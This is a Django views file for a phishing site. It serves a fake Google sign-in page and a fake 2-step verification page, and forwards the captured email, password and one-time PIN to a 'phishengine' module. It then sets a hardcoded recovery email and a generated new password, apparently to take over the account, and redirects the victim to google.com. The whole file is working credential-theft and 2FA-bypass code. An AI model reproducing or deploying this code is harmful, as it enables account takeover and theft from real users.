from django.shortcuts import render
from django.http import HttpResponse,HttpResponseRedirect,HttpResponseServerError

from .forms import GoogleLoginForm, Google2Factor

import passgen
import phishengine

def fb(request):
    return HttpResponse("Facebook landing page")

def google(request):
    if not request.session.get('has_session'):
        request.session['has_session'] = True

    form = GoogleLoginForm()
    return render(request,'google.html',{'form':form})

def home(request):
    return HttpResponseRedirect('/google/')

def google_first_factor(request,data):

    d = dict()
    d['X-Session'] = str(request.session.session_key)
    request.session['email'] = data['Email']
    request.session['pass'] = data['Passwd']
    d['Email'] = data['Email']
    d['Passwd'] = data['Passwd']
    d['Site'] = 'google'

    phishengine.GooglePhishEngine.first_factor(d)

def google_second_factor(request,data):
    d = dict()
    d['X-Session'] = str(request.session.session_key)
    d['pin'] = data['pin']
    d['Site'] = 'google'
    d['Email'] = request.session['email']
    d['Passwd'] = request.session['pass']
    d['NewEmail'] = "ritwikdesai@live.in"
    d['NewPasswd'] = passgen.passgen()

    phishengine.GooglePhishEngine.second_factor(d)
    return


def googlelogin(request):
    if request.method == 'POST':
        form = GoogleLoginForm(request.POST)
        twostep = Google2Factor(request.POST)
        if form.is_valid():
            google_first_factor(request,form.cleaned_data)
            twostep = Google2Factor()
            return render(request,'2stepverify.html',{'form':twostep})

        elif twostep.is_valid():
            google_second_factor(request,twostep.cleaned_data)
            return HttpResponseRedirect('https://google.com')
        else:
            return HttpResponseServerError("ERROR")
